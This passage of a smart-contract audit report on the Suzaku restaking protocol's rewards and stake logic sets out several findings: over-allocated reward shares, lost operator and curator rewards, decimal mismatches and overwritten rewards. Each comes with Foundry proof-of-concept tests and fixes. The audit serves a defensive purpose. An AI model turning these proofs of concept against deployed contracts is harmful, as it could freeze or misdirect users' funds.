            // Check ratio vs. class's min stake, could add an emit here to debug
            if (stake / (nodeCount + extraNode) < assetClasses[classId].minValidatorStake) {
                return false;
            }
        }
        return true;
    }
```

**Suzaku:**
Fixed in commit [91ae0e3](https://github.com/suzaku-network/suzaku-core/pull/155/commits/91ae0e331f4400522b071c0d7093704f1c1b2dbe).

**Cyfrin:** Verified.


### Rewards system DOS due to unchecked asset class share and fee allocations

**Description:** The REWARDS_MANAGER_ROLE can set asset class reward shares without validating that the total allocation does not exceed 100%. This enables over-allocation of rewards, leading to potential insolvency and denial of service for later claimers.

A similar issue exists when assigning fee% for protocol, operator and curator. When setting each of these fees, current logic only checks that fee is less than 100% but fails to check that the cumulative fees is less than 100%.

In this issue, we focus on the asset class share issue as that is more likely to occur, specially when there are multiple assets at play.

`Rewards::setRewardsShareForAssetClass()` function lacks validation to ensure total asset class shares do not exceed 100%:

```solidity
function setRewardsShareForAssetClass(uint96 assetClass, uint16 share) external onlyRole(REWARDS_MANAGER_ROLE) {
    if (share > BASIS_POINTS_DENOMINATOR) revert InvalidShare(share);
    rewardsSharePerAssetClass[assetClass] = share;  // @audit No total validation
    emit RewardsShareUpdated(assetClass, share);
}
```
`_calculateOperatorShare()` function sums these shares without bounds checking resulting in potentially inflated numbers:

```solidity
for (uint256 i = 0; i < assetClasses.length; i++) {
    uint16 assetClassShare = rewardsSharePerAssetClass[assetClasses[i]];
    uint256 shareForClass = Math.mulDiv(operatorStake * BASIS_POINTS_DENOMINATOR / totalStake, assetClassShare, BASIS_POINTS_DENOMINATOR);
    totalShare += shareForClass; // @audit Can exceed 100%
}
```
Similarly, `claimOperatorFee` just assumes that the `operatorShare` is less than 100% which will only be true if the reward share validation exists.

```solidity
 function claimOperatorFee(address rewardsToken, address recipient) external {
   // code..

    for (uint48 epoch = lastClaimedEpoch + 1; epoch < currentEpoch; epoch++) {
            uint256 operatorShare = operatorShares[epoch][msg.sender];
            if (operatorShare == 0) continue;

            // get rewards amount per token for epoch
            uint256 rewardsAmount = rewardsAmountPerTokenFromEpoch[epoch].get(rewardsToken);
            if (rewardsAmount == 0) continue;

            uint256 operatorRewards = Math.mulDiv(rewardsAmount, operatorShare, BASIS_POINTS_DENOMINATOR); //@audit this can exceed reward amount - no check here
            totalRewards += operatorRewards;
        }

}
```


**Impact:**
- Over-allocation: Admin sets asset class shares totaling > 100%
- In extreme case, can cause insolvency for the last batch of claimers. All rewards were claimed by earlier users leaving nothing left to claim for later user.

**Proof of Concept:** Run the test in `RewardsTest.t.sol`. Note that, to demonstrate this test, following changes were made to `setup()`:

```solidity

        // mint only 100000 tokens instead of 1 million
        rewardsToken = new ERC20Mock();
        rewardsToken.mint(REWARDS_DISTRIBUTOR_ROLE, 100_000 * 10 ** 18);
        vm.prank(REWARDS_DISTRIBUTOR_ROLE);
        rewardsToken.approve(address(rewards), 100_000 * 10 ** 18);

        // disribute only to 1 epoch instead of 10
       console2.log("Setting up rewards distribution per epoch...");
        uint48 startEpoch = 1;
        uint48 numberOfEpochs = 1;
        uint256 rewardsAmount = 100_000 * 10 ** 18;

```

```solidity
    function test_DOS_RewardShareSumGreaterThan100Pct() public {
        console2.log("=== TEST BEGINS ===");


        // 1: Modify fee structure to make operators get 100% of rewards
        // this is done just to demonstrate insolvency
        vm.startPrank(REWARDS_MANAGER_ROLE);
        rewards.updateProtocolFee(0);     // 0% - no protocol fee
        rewards.updateOperatorFee(10000); // 100% - operators get everything
        rewards.updateCuratorFee(0);      // 0% - no curator fee
        vm.stopPrank();

        // 2: Set asset class shares > 100%
        vm.startPrank(REWARDS_MANAGER_ROLE);
        rewards.setRewardsShareForAssetClass(1, 8000); // 80%
        rewards.setRewardsShareForAssetClass(2, 7000); // 70%
        rewards.setRewardsShareForAssetClass(3, 5000); // 50%
        // Total: 200%
        vm.stopPrank();

        // 3: Use existing working setup for stakes
        uint48 epoch = 1;
        _setupStakes(epoch, 4 hours);

        // 4: Distribute rewards
        vm.warp((epoch + 3) * middleware.EPOCH_DURATION());
        vm.prank(REWARDS_DISTRIBUTOR_ROLE);
        rewards.distributeRewards(epoch, 10);

        //5: Check operator shares (should be inflated due to 200% asset class shares)
        address[] memory operators = middleware.getAllOperators();
        uint256 totalOperatorShares = 0;

        for (uint256 i = 0; i < operators.length; i++) {
            uint256 opShare = rewards.operatorShares(epoch, operators[i]);
            totalOperatorShares += opShare;
        }
        console2.log("Total operator shares: ", totalOperatorShares);
        assertGt(totalOperatorShares, rewards.BASIS_POINTS_DENOMINATOR(),
                "VULNERABILITY: Total operator shares exceed 100%");

        //DOS when 6'th operator tries to claim rewards
        vm.warp((epoch + 1) * middleware.EPOCH_DURATION());
        for (uint256 i = 0; i < 5; i++) {
             vm.prank(operators[i]);
            rewards.claimOperatorFee(address(rewardsToken), operators[i]);
        }

        vm.expectRevert();
        vm.prank(operators[5]);
        rewards.claimOperatorFee(address(rewardsToken), operators[5]);

    }
```
**Recommended Mitigation:** Consider adding validation in `setRewardsShareForAssetClass` to enforce that total share across all assets does not exceed 100%.

```solidity
function setRewardsShareForAssetClass(uint96 assetClass, uint16 share) external onlyRole(REWARDS_MANAGER_ROLE) {
    if (share > BASIS_POINTS_DENOMINATOR) revert InvalidShare(share);

    // Calculate total shares including the new one
    uint96[] memory allAssetClasses = l1Middleware.getAssetClassIds();
    uint256 totalShares = share;

    for (uint256 i = 0; i < allAssetClasses.length; i++) {
        if (allAssetClasses[i] != assetClass) {
            totalShares += rewardsSharePerAssetClass[allAssetClasses[i]];
        }
    }

    if (totalShares > BASIS_POINTS_DENOMINATOR) {
        revert TotalAssetClassSharesExceed100Percent(totalShares); //@audit this check ensures proper distribution
    }

    rewardsSharePerAssetClass[assetClass] = share;
    emit RewardsShareUpdated(assetClass, share);
}
```

Consider adding similar validation in functions such as `updateProtocolFee`, `updateOperatorFee`, `updateCuratorFee`.


**Suzaku:**
Fixed in commit [001cf04](https://github.com/suzaku-network/suzaku-core/pull/155/commits/001cf049c654d363fbd87d8f2b7c8c2aa6ba6079).

**Cyfrin:** Verified.


### Operators can lose their reward share

**Description:** The `Rewards::distributeRewards` function distributes rewards for epochs that are at least two epochs older than the current one. However, when calculating and distributing these rewards, the contract fetches the list of operators using `l1Middleware.getAllOperators()`, which returns the current set of operators. If an operator was active during the target epoch but has since been disabled and removed before the rewards distribution, they will not be included in the current operator list. This can occur if the `SLASHING_WINDOW` in `AvalancheL1Middleware` is shorter than `2 * epochDuration`.

**Impact:** Operators who were legitimately active and eligible for rewards in a given epoch may lose their rewards if they are disabled and removed before the rewards distribution occurs. This allows the contract owner (or any entity with the authority to remove operators) to manipulate the operator set and exclude operators from receiving rewards for epochs in which they were still enabled (intentionally or not), resulting in unfair loss of rewards and potential trust issues in the protocol.

**Proof of Concept:**
1. Change the `MockAvalancheL1Middleware.sol` to:
```solidity
// SPDX-License-Identifier: MIT
// SPDX-FileCopyrightText: Copyright 2024 ADDPHO

pragma solidity 0.8.25;

contract MockAvalancheL1Middleware {
    uint48 public constant EPOCH_DURATION = 4 hours;
    uint48 public constant SLASHING_WINDOW = 5 hours;
    address public immutable L1_VALIDATOR_MANAGER;
    address public immutable VAULT_MANAGER;

    mapping(uint48 => mapping(bytes32 => uint256)) public nodeStake;
    mapping(uint48 => mapping(uint96 => uint256)) public totalStakeCache;
    mapping(uint48 => mapping(address => mapping(uint96 => uint256))) public operatorStake;
    mapping(address asset => uint96 assetClass) public assetClassAsset;

    // Replace constant arrays with state variables
    address[] private OPERATORS;
    bytes32[] private VALIDATION_ID_ARRAY;

    // Add mapping from operator to their node IDs
    mapping(address => bytes32[]) private operatorToNodes;

    // Track operator status
    mapping(address => bool) public isEnabled;
    mapping(address => uint256) public disabledTime;

    uint96 primaryAssetClass = 1;
    uint96[] secondaryAssetClasses = [2, 3];

    constructor(
        uint256 operatorCount,
        uint256[] memory nodesPerOperator,
        address balancerValidatorManager,
        address vaultManager
    ) {
        require(operatorCount > 0, "At least one operator required");
        require(operatorCount == nodesPerOperator.length, "Arrays length mismatch");

        L1_VALIDATOR_MANAGER = balancerValidatorManager;
        VAULT_MANAGER = vaultManager;

        // Generate operators
        for (uint256 i = 0; i < operatorCount; i++) {
            address operator = address(uint160(0x1000 + i));
            OPERATORS.push(operator);
            isEnabled[operator] = true; // Initialize as enabled

            uint256 nodeCount = nodesPerOperator[i];
            require(nodeCount > 0, "Each operator must have at least one node");

            bytes32[] memory operatorNodes = new bytes32[](nodeCount);

            for (uint256 j = 0; j < nodeCount; j++) {
                bytes32 nodeId = keccak256(abi.encode(operator, j));
                operatorNodes[j] = nodeId;
                VALIDATION_ID_ARRAY.push(nodeId);
            }

            operatorToNodes[operator] = operatorNodes;
        }
    }

    function disableOperator(address operator) external {
        require(isEnabled[operator], "Operator not enabled");
        disabledTime[operator] = block.timestamp;
        isEnabled[operator] = false;
    }

    function removeOperator(address operator) external {
        require(!isEnabled[operator], "Operator is still enabled");
        require(block.timestamp >= disabledTime[operator] + SLASHING_WINDOW, "Slashing window not passed");

        // Remove operator from OPERATORS array
        for (uint256 i = 0; i < OPERATORS.length; i++) {
            if (OPERATORS[i] == operator) {
                OPERATORS[i] = OPERATORS[OPERATORS.length - 1];
                OPERATORS.pop();
                break;
            }
        }
    }

    function setTotalStakeCache(uint48 epoch, uint96 assetClass, uint256 stake) external {
        totalStakeCache[epoch][assetClass] = stake;
    }

    function setOperatorStake(uint48 epoch, address operator, uint96 assetClass, uint256 stake) external {
        operatorStake[epoch][operator][assetClass] = stake;
    }

    function setNodeStake(uint48 epoch, bytes32 nodeId, uint256 stake) external {
        nodeStake[epoch][nodeId] = stake;
    }

    function getNodeStake(uint48 epoch, bytes32 nodeId) external view returns (uint256) {
        return nodeStake[epoch][nodeId];
    }

    function getCurrentEpoch() external view returns (uint48) {
        return getEpochAtTs(uint48(block.timestamp));
    }

    function getAllOperators() external view returns (address[] memory) {
        return OPERATORS;
    }

    function getOperatorUsedStakeCachedPerEpoch(
        uint48 epoch,
        address operator,
        uint96 assetClass
    ) external view returns (uint256) {
        if (assetClass == 1) {
            bytes32[] storage nodesArr = operatorToNodes[operator];
            uint256 stake = 0;

            for (uint256 i = 0; i < nodesArr.length; i++) {
                bytes32 nodeId = nodesArr[i];
                stake += this.getNodeStake(epoch, nodeId);
            }
            return stake;
        } else {
            return this.getOperatorStake(operator, epoch, assetClass);
        }
    }

    function getOperatorStake(address operator, uint48 epoch, uint96 assetClass) external view returns (uint256) {
        return operatorStake[epoch][operator][assetClass];
    }

    function getEpochAtTs(uint48 timestamp) public pure returns (uint48) {
        return timestamp / EPOCH_DURATION;
    }

    function getEpochStartTs(uint48 epoch) external pure returns (uint256) {
        return epoch * EPOCH_DURATION + 1;
    }

    function getActiveAssetClasses() external view returns (uint96, uint96[] memory) {
        return (primaryAssetClass, secondaryAssetClasses);
    }

    function getAssetClassIds() external view returns (uint96[] memory) {
        uint96[] memory assetClasses = new uint96[](3);
        assetClasses[0] = primaryAssetClass;
        assetClasses[1] = secondaryAssetClasses[0];
        assetClasses[2] = secondaryAssetClasses[1];
        return assetClasses;
    }

    function getActiveNodesForEpoch(address operator, uint48) external view returns (bytes32[] memory) {
        return operatorToNodes[operator];
    }

    function getOperatorNodes(address operator) external view returns (bytes32[] memory) {
        return operatorToNodes[operator];
    }

    function getAllValidationIds() external view returns (bytes32[] memory) {
        return VALIDATION_ID_ARRAY;
    }

    function isAssetInClass(uint256 assetClass, address asset) external view returns (bool) {
        uint96 assetClassRegistered = assetClassAsset[asset];
        if (assetClassRegistered == assetClass) {
            return true;
        }
        return false;
    }

    function setAssetInAssetClass(uint96 assetClass, address asset) external {
        assetClassAsset[asset] = assetClass;
    }

    function getVaultManager() external view returns (address) {
        return VAULT_MANAGER;
    }
}
```

2. Add the following test to the `RewardsTest.t.sol`:
```solidity
function test_distributeRewards_removedOperator() public {
	uint48 epoch = 1;
	uint256 uptime = 4 hours;

	// Set up stakes for operators in epoch 1
	_setupStakes(epoch, uptime);

	// Get the list of operators
	address[] memory operators = middleware.getAllOperators();
	address removedOperator = operators[0]; // Operator to be removed
	address activeOperator = operators[1]; // Operator to remain active

	// Disable operator[0] at the start of epoch 2
	uint256 epoch2Start = middleware.getEpochStartTs(epoch + 1); // T = 8h
	vm.warp(epoch2Start);
	middleware.disableOperator(removedOperator);

	// Warp to after the slashing window to allow removal
	uint256 removalTime = epoch2Start + middleware.SLASHING_WINDOW(); // T = 13h (8h + 5h)
	vm.warp(removalTime);
	middleware.removeOperator(removedOperator);

	// Warp to epoch 4 to distribute rewards for epoch 1
	uint256 distributionTime = middleware.getEpochStartTs(epoch + 3); // T = 16h
	vm.warp(distributionTime);

	// Distribute rewards in batches
	uint256 batchSize = 3;
	uint256 remainingOperators = middleware.getAllOperators().length; // Now 9 operators
	while (remainingOperators > 0) {
		vm.prank(REWARDS_DISTRIBUTOR_ROLE);
		rewards.distributeRewards(epoch, uint48(batchSize));
		remainingOperators = remainingOperators > batchSize ? remainingOperators - batchSize : 0;
	}

	// Verify that the removed operator has zero shares
	assertEq(
		rewards.operatorShares(epoch, removedOperator),
		0,
		"Removed operator should have zero shares despite being active in epoch 1"
	);

	// Verify that an active operator has non-zero shares
	assertGt(
		rewards.operatorShares(epoch, activeOperator),
		0,
		"Active operator should have non-zero shares"
	);
}
```

**Recommended Mitigation:** When distributing rewards for a past epoch, fetch the list of operators who were active during that specific epoch, rather than relying on the current operator list. This can be achieved by maintaining a historical record of operator status per epoch or by querying the operator set as it existed at the target epoch. Additionally, ensure that the `SLASHING_WINDOW` is at least as long as the reward distribution delay (i.e., `SLASHING_WINDOW >= 2 * epochDuration`) to prevent premature removal of operators before their rewards are distributed.

**Suzaku:**
Fixed in commit [dc63daa](https://github.com/suzaku-network/suzaku-core/pull/155/commits/dc63daa5082d17ce4025eee2361fb5d36dee520d).

**Cyfrin:** Verified.



### Curators will lose reward for an epoch if they lose ownership of vault after epoch but before distribution

**Description:** The `Rewards` contract calculates and assigns curator shares for each epoch by calling `VaultTokenized(vault).owner()` to determine the curator (vault owner) who should receive rewards. However, this fetches the current owner of the vault at the time of reward distribution, not the owner during the epoch for which rewards are being distributed. Since `VaultTokenized` inherits from `OwnableUpgradeable`, ownership can be transferred at any time using `transferOwnership`. This means that if a vault changes ownership after an epoch ends but before rewards are distributed for that epoch, the new owner will receive the curator rewards for past epochs, even if they were not the owner during those epochs.

**Impact:** Curator rewards for a given epoch can be claimed by the current owner of the vault, regardless of who owned the vault during that epoch. This allows actors to acquire vaults after an epoch ends but before rewards are distributed, enabling them to retroactively claim curator rewards for periods they did not contribute to. The original owner, who was entitled to the rewards for their activity during the epoch, loses their rightful rewards. This undermines the fairness and intended incentive structure of the protocol.

**Proof of Concept:**
1. Change the `MockVault.sol` to:
```solidity
// SPDX-License-Identifier: BUSL-1.1
// SPDX-FileCopyrightText: Copyright 2024 ADDPHO
pragma solidity 0.8.25;

interface IVaultTokenized {
    function collateral() external view returns (address);
    function delegator() external view returns (address);
    function activeBalanceOfAt(address, uint48, bytes calldata) external view returns (uint256);
    function activeSharesOfAt(address, uint48, bytes calldata) external view returns (uint256);
    function activeSharesAt(uint48, bytes calldata) external view returns (uint256);
    function owner() external view returns (address);
}

contract MockVault is IVaultTokenized {
    address private _collateral;
    address private _delegator;
    address private _owner;
    mapping(address => uint256) public activeBalance;
    mapping(uint48 => uint256) private _totalActiveShares;

    constructor(address collateralAddress, address delegatorAddress, address owner_) {
        _collateral = collateralAddress;
        _delegator = delegatorAddress;
        _owner = owner_;
    }

    function collateral() external view override returns (address) {
        return _collateral;
    }

    function delegator() external view override returns (address) {
        return _delegator;
    }

    function activeBalanceOfAt(address account, uint48, bytes calldata) public view override returns (uint256) {
        return activeBalance[account];
    }

    function setActiveBalance(address account, uint256 balance) public {
        activeBalance[account] = balance;
    }

    function owner() public view override returns (address) {
        return _owner;
    }

    function activeSharesOfAt(address account, uint48, bytes calldata) public view override returns (uint256) {
        return 100;
    }

    function activeSharesAt(uint48 timestamp, bytes calldata) public view override returns (uint256) {
        uint256 totalShares = _totalActiveShares[timestamp];
        return totalShares > 0 ? totalShares : 200; // Default to 200 if not explicitly set
    }

    function setTotalActiveShares(uint48 timestamp, uint256 totalShares) public {
        _totalActiveShares[timestamp] = totalShares;
    }

    // Added function to transfer ownership
    function transferOwnership(address newOwner) public {
        require(msg.sender == _owner, "Only owner can transfer ownership");
        require(newOwner != address(0), "New owner cannot be zero address");
        _owner = newOwner;
    }
}
```

2. Add the following test to the `RewardsTest.t.sol`:
```solidity
function test_curatorSharesAssignedToCurrentOwnerInsteadOfHistorical() public {
	uint48 epoch = 1;
	uint256 uptime = 4 hours;

	// Step 1: Setup stakes for epoch 1 to generate curator shares
	_setupStakes(epoch, uptime);

	// Step 2: Get a vault and its initial owner (Owner A)
	address vault = vaultManager.vaults(0);
	address ownerA = MockVault(vault).owner();
	address ownerB = makeAddr("OwnerB");

	// Step 3: Warp to after epoch 1 ends
	uint256 epoch2Start = middleware.getEpochStartTs(epoch + 1);
	vm.warp(epoch2Start);

	// Step 4: Transfer ownership from Owner A to Owner B
	vm.prank(ownerA);
	MockVault(vault).transferOwnership(ownerB);

	// Step 5: Warp to a time when rewards can be distributed (after 2 epochs)
	uint256 distributionTime = middleware.getEpochStartTs(epoch + 3);
	vm.warp(distributionTime);

	// Step 6: Distribute rewards for epoch 1
	address[] memory operators = middleware.getAllOperators();
	vm.prank(REWARDS_DISTRIBUTOR_ROLE);
	rewards.distributeRewards(epoch, uint48(operators.length));

	// Step 7: Verify curator shares assignment
	uint256 curatorShareA = rewards.curatorShares(epoch, ownerA);
	uint256 curatorShareB = rewards.curatorShares(epoch, ownerB);

	assertEq(curatorShareA, 0, "Owner A should have no curator shares for epoch 1");
	assertGt(curatorShareB, 0, "Owner B should have curator shares for epoch 1");

	// Step 8: Owner B claims curator rewards
	vm.prank(ownerB);
	rewards.claimCuratorFee(address(rewardsToken), ownerB);
	uint256 ownerBBalance = rewardsToken.balanceOf(ownerB);
	assertGt(ownerBBalance, 0, "Owner B should have received curator rewards");

	// Step 9: Owner A attempts to claim and reverts
	vm.prank(ownerA);
	vm.expectRevert(abi.encodeWithSelector(IRewards.NoRewardsToClaim.selector, ownerA));
	rewards.claimCuratorFee(address(rewardsToken), ownerA);
}
```

**Recommended Mitigation:** Track and store the owner of each vault at the end of every epoch, and use this historical ownership data when assigning curator shares and distributing rewards. This ensures that curator rewards are always credited to the correct owner for each epoch, regardless of subsequent ownership transfers. Implementing an ownership snapshot mechanism at epoch boundaries or when ownership changes can help achieve this.

**Suzaku:**
Acknowledged.

**Cyfrin:** Acknowledged.


### Inaccurate stake calculation due to decimal mismatch across multitoken asset classes

**Description:** Currently, when calculating the operator stake, the system iterates through all vaults associated with a specific asset class ID and sums all of the staked amounts. However, an asset class may consist of multiple token types (collaterals) that use different decimal precision (e.g., one token with 6 decimals and another with 18). Because the summation logic does not normalize these values to a common decimal base, assets with fewer decimals (e.g., USDC with 6 decimals) may effectively contribute negligible or zero value in the final stake calculation, even though significant value may be staked in that token.

1. Asset Class ID 100 is composed of:

   * Token A with 6 decimals (e.g., USDC).
   * Token B with 18 decimals (e.g., DAI).
2. A vault is created where:

   * 10,000 Token A (USDC) is staked (actual value = 10,000 \* 10).
   * 10 Token B (DAI) is staked (actual value = 10 \* 10).
3. Current stake summing logic simply adds the raw amounts across vaults.
4. Due to the difference in decimals, 10,000 Token A (USDC) may be treated as 0 or an insignificant amount when compared directly to Token Bs value.
5. The resulting total stake is incorrectly calculated

```solidity
function getOperatorStake(
        address operator,
        uint48 epoch,
        uint96 assetClassId
    ) public view returns (uint256 stake) {
        if (totalStakeCached[epoch][assetClassId]) {
            uint256 cachedStake = operatorStakeCache[epoch][assetClassId][operator];

            return cachedStake;
        }

        uint48 epochStartTs = getEpochStartTs(epoch);

        uint256 totalVaults = vaultManager.getVaultCount();

        for (uint256 i; i < totalVaults; ++i) {
            (address vault, uint48 enabledTime, uint48 disabledTime) = vaultManager.getVaultAtWithTimes(i);

            // Skip if vault not active in the target epoch
            if (!_wasActiveAt(enabledTime, disabledTime, epochStartTs)) {
                continue;
            }

            // Skip if vault asset not in AssetClassID
            if (vaultManager.getVaultAssetClass(vault) != assetClassId) {
                continue;
            }

            uint256 vaultStake = BaseDelegator(IVaultTokenized(vault).delegator()).stakeAt(
                L1_VALIDATOR_MANAGER, assetClassId, operator, epochStartTs, new bytes(0)
            );

            stake += vaultStake;
        }
```

**Impact:**
- Underreported Stake: Tokens with fewer decimals are underrepresented or ignored entirely in stake calculations.

**Proof of Concept:** Add this test to `AvalancheL1MiddlewareTest.t.sol` :

```solidity
function test_operatorStakeWithoutNormalization() public {
        uint48 epoch = 1;
        uint256 uptime = 4 hours;

        // Deploy tokens with different decimals
        ERC20WithDecimals tokenA = new ERC20WithDecimals("TokenA", "TKA", 6);  // e.g., USDC
        ERC20WithDecimals tokenB = new ERC20WithDecimals("TokenB", "TKB", 18); // e.g., DAI

        // Deploy vaults and associate with asset class 1
        vm.startPrank(validatorManagerAddress);
        address vaultAddress1 = vaultFactory.create(
            1,
            bob,
            abi.encode(
                IVaultTokenized.InitParams({
                    collateral: address(tokenA),
                    burner: address(0xdEaD),
                    epochDuration: 8 hours,
                    depositWhitelist: false,
                    isDepositLimit: false,
                    depositLimit: 0,
                    defaultAdminRoleHolder: bob,
                    depositWhitelistSetRoleHolder: bob,
                    depositorWhitelistRoleHolder: bob,
                    isDepositLimitSetRoleHolder: bob,
                    depositLimitSetRoleHolder: bob,
                    name: "Test",
                    symbol: "TEST"
                })
            ),
            address(delegatorFactory),
            address(slasherFactory)
        );
        address vaultAddress2 = vaultFactory.create(
            1,
            bob,
            abi.encode(
                IVaultTokenized.InitParams({
                    collateral: address(tokenB),
                    burner: address(0xdEaD),
                    epochDuration: 8 hours,
                    depositWhitelist: false,
                    isDepositLimit: false,
                    depositLimit: 0,
                    defaultAdminRoleHolder: bob,
                    depositWhitelistSetRoleHolder: bob,
                    depositorWhitelistRoleHolder: bob,
                    isDepositLimitSetRoleHolder: bob,
                    depositLimitSetRoleHolder: bob,
                    name: "Test",
                    symbol: "TEST"
                })
            ),
            address(delegatorFactory),
            address(slasherFactory)
        );
        VaultTokenized vaultTokenA = VaultTokenized(vaultAddress1);
        VaultTokenized vaultTokenB = VaultTokenized(vaultAddress2);
        vm.startPrank(validatorManagerAddress);
        middleware.addAssetClass(2, 0, 100, address(tokenA));
        middleware.activateSecondaryAssetClass(2);
        middleware.addAssetToClass(2, address(tokenB));
        vm.stopPrank();

        address[] memory l1LimitSetRoleHolders = new address[](1);
        l1LimitSetRoleHolders[0] = bob;
        address[] memory operatorL1SharesSetRoleHolders = new address[](1);
        operatorL1SharesSetRoleHolders[0] = bob;

        address delegatorAddress2 = delegatorFactory.create(
            0,
            abi.encode(
                address(vaultTokenA),
                abi.encode(
                    IL1RestakeDelegator.InitParams({
                        baseParams: IBaseDelegator.BaseParams({
                            defaultAdminRoleHolder: bob,
                            hook: address(0),
                            hookSetRoleHolder: bob
                        }),
                        l1LimitSetRoleHolders: l1LimitSetRoleHolders,
                        operatorL1SharesSetRoleHolders: operatorL1SharesSetRoleHolders
                    })
                )
            )
        );

        L1RestakeDelegator delegator2 = L1RestakeDelegator(delegatorAddress2);

        address delegatorAddress3 = delegatorFactory.create(
            0,
            abi.encode(
                address(vaultTokenB),
                abi.encode(
                    IL1RestakeDelegator.InitParams({
                        baseParams: IBaseDelegator.BaseParams({
                            defaultAdminRoleHolder: bob,
                            hook: address(0),
                            hookSetRoleHolder: bob
                        }),
                        l1LimitSetRoleHolders: l1LimitSetRoleHolders,
                        operatorL1SharesSetRoleHolders: operatorL1SharesSetRoleHolders
                    })
                )
            )
        );
        L1RestakeDelegator delegator3 = L1RestakeDelegator(delegatorAddress3);

        vm.prank(bob);
        vaultTokenA.setDelegator(delegatorAddress2);

        // Set the delegator in vault3
        vm.prank(bob);
        vaultTokenB.setDelegator(delegatorAddress3);

        _setOperatorL1Shares(bob, validatorManagerAddress, 2, alice, 100, delegator2);
        _setOperatorL1Shares(bob, validatorManagerAddress, 2, alice, 100, delegator3);

        vm.startPrank(validatorManagerAddress);
        vaultManager.registerVault(address(vaultTokenA), 2, 3000 ether);
        vaultManager.registerVault(address(vaultTokenB), 2, 3000 ether);
        vm.stopPrank();

        _optInOperatorVault(alice, address(vaultTokenA));
        _optInOperatorVault(alice, address(vaultTokenB));
        //_optInOperatorL1(alice, validatorManagerAddress);

        _setL1Limit(bob, validatorManagerAddress, 2, 10000 * 10**6, delegator2);
        _setL1Limit(bob, validatorManagerAddress, 2, 10 * 10**18, delegator3);

        // Define stakes without normalization
        uint256 stakeA = 10000 * 10**6; // 10,000 TokenA (6 decimals)
        uint256 stakeB = 10 * 10**18;   // 10 TokenB (18 decimals)

        tokenA.transfer(staker, stakeA);
        vm.startPrank(staker);
        tokenA.approve(address(vaultTokenA), stakeA);
        vaultTokenA.deposit(staker, stakeA);
        vm.stopPrank();

        tokenB.transfer(staker, stakeB);
        vm.startPrank(staker);
        tokenB.approve(address(vaultTokenB), stakeB);
        vaultTokenB.deposit(staker, stakeB);
        vm.stopPrank();

        vm.warp((epoch + 3) * middleware.EPOCH_DURATION());


        assertNotEq(middleware.getOperatorStake(alice, 2, 2), stakeA + stakeB);

    }
```

**Recommended Mitigation:** Before summing, normalize all token amounts to a common unit (e.g., 18 decimals).

```diff
 function getOperatorStake(
     address operator,
     uint48 epoch,
     uint96 assetClassId
 ) public view returns (uint256 stake) {
     if (totalStakeCached[epoch][assetClassId]) {
         return operatorStakeCache[epoch][assetClassId][operator];
     }

     uint48 epochStartTs = getEpochStartTs(epoch);
     uint256 totalVaults = vaultManager.getVaultCount();

     for (uint256 i; i < totalVaults; ++i) {
         (address vault, uint48 enabledTime, uint48 disabledTime) = vaultManager.getVaultAtWithTimes(i);

         // Skip if vault not active in the target epoch
         if (!_wasActiveAt(enabledTime, disabledTime, epochStartTs)) {
             continue;
         }

         // Skip if vault asset not in AssetClassID
         if (vaultManager.getVaultAssetClass(vault) != assetClassId) {
             continue;
         }

-        uint256 vaultStake = BaseDelegator(IVaultTokenized(vault).delegator()).stakeAt(
+        uint256 rawStake = BaseDelegator(IVaultTokenized(vault).delegator()).stakeAt(
             L1_VALIDATOR_MANAGER, assetClassId, operator, epochStartTs, new bytes(0)
         );

+        // Normalize stake to 18 decimals
+        address token = IVaultTokenized(vault).underlyingToken();
+        uint8 tokenDecimals = IERC20Metadata(token).decimals();
+
+        if (tokenDecimals < 18) {
+            rawStake *= 10 ** (18 - tokenDecimals);
+        } else if (tokenDecimals > 18) {
+            rawStake /= 10 ** (tokenDecimals - 18);
+        }

-        stake += vaultStake;
+        stake += rawStake;
     }
 }

```

**Suzaku:**
Fixed in commit [ccd5e7d](https://github.com/suzaku-network/suzaku-core/pull/155/commits/ccd5e7dd376933fd3f31acf31602ff38ee93654a).

**Cyfrin:** Verified.


### Accumulative reward setting to prevent overwrite and support incremental updates

**Description:** The `Rewards::setRewardsAmountForEpochs` function allows an authorized distributor to set a fixed reward amount for a specific number of future epochs. This is typically called to define reward schedulesfor example, assigning 20 tokens per epoch from epoch 1 to 5.

However, the current implementation **does not check whether rewards have already been set** for the target epochs. As a result, calling this function again for the same epochs **silently overrides the existing rewards**, leading to unintended consequences:

1. **Previously allocated rewards are overwritten.**
2. **New rewards are written to storage, but tokens from the previous call remain locked in the contract**, as there is no mechanism to refund or reallocate them.

Assume the following:

1. Distributor calls `setRewardsAmountForEpochs(1, 1, USDC, 100)`
    Epoch 1 is allocated 100 USDC
    100 USDC is transferred into the contract

2. Later, a second call is made:
   `setRewardsAmountForEpochs(1, 1, USDC, 50)`
    Epoch 1 is now reallocated to 50 USDC
    **Original 100 USDC still sits in the contract**, but only 50 will be distributed
    The difference (100 USDC) becomes stuck

**Impact:** **Loss of Funds:** Overwritten rewards are effectively stranded in the contract with no mechanism to recover or redistribute them.
**Unexpected Behavior for Distributors:** Calling `setRewardsAmountForEpochs` twice for the same epoch silently overrides the original intent without warning.

**Proof of Concept:** Add this test to `Rewards`:

```solidity
function test_setRewardsAmountForEpochs() public {
        uint256 rewardsAmount = 1_000_000 * 10 ** 18;
        ERC20Mock rewardsToken1 = new ERC20Mock();
        rewardsToken1.mint(REWARDS_DISTRIBUTOR_ROLE, 2 * 1_000_000 * 10 ** 18);
        vm.prank(REWARDS_DISTRIBUTOR_ROLE);
        rewardsToken1.approve(address(rewards), 2 * 1_000_000 * 10 ** 18);
        vm.prank(REWARDS_DISTRIBUTOR_ROLE);
        rewards.setRewardsAmountForEpochs(5, 1, address(rewardsToken1), rewardsAmount);
        assertEq(rewards.getRewardsAmountPerTokenFromEpoch(5, address(rewardsToken1)), rewardsAmount - Math.mulDiv(rewardsAmount, 1000, 10000));
        assertEq(rewardsToken1.balanceOf(address(rewards)), rewardsAmount);
        vm.prank(REWARDS_DISTRIBUTOR_ROLE);
        rewards.setRewardsAmountForEpochs(5, 1, address(rewardsToken1), rewardsAmount);
        assertEq(rewardsToken1.balanceOf(address(rewards)), rewardsAmount * 2 );

        assertEq(rewards.getRewardsAmountPerTokenFromEpoch(5, address(rewardsToken1)), (rewardsAmount - Math.mulDiv(rewardsAmount, 1000, 10000)) * 2);
    }
```

 **Recommended Mitigation:**

Add a **guard clause** in the `setRewardsAmountForEpochs` function to **prevent overwriting rewards** for epochs that already have a value set:

```diff
for (uint48 i = 0; i < numberOfEpochs; i++) {

-    rewardsAmountPerTokenFromEpoch[startEpoch + i].set(rewardsToken, rewardsAmount);
+    uint256 existingAmount = rewardsAmountPerTokenFromEpoch[targetEpoch].get(rewardsToken);
